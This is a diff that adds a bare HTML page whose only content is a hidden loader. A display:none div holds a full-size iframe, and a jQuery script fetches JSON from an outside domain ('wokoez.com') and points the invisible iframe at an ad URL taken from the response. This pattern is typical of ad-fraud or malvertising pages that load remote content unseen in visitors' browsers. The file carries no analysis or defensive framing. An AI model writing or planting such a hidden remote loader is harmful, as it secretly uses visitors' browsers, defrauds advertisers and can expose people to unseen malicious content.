@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+</head>
+<body>
+    
+    <div style="display:none;">
+   	<iframe id="id1" src="" height="768" width="1366" ></iframe>
+   </div>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"> </script>
+
+
+
+    <script>
+		$.getJSON("https://wokoez.com/phtbload?a=1&e=aeyJwaWQiOjExOTEwODksInNpZCI6MTM5NjI2OSwid2lkIjo2NjcwMDd9&chpv=10.0.0", function(result){
+      			$.each(result, function(i, field){
+			$('#id1').attr('src', field.ads[0].uf);
+
+      		});
+    	});
+   </script>
+
+
+
+
+
+
+</body>
+</html>
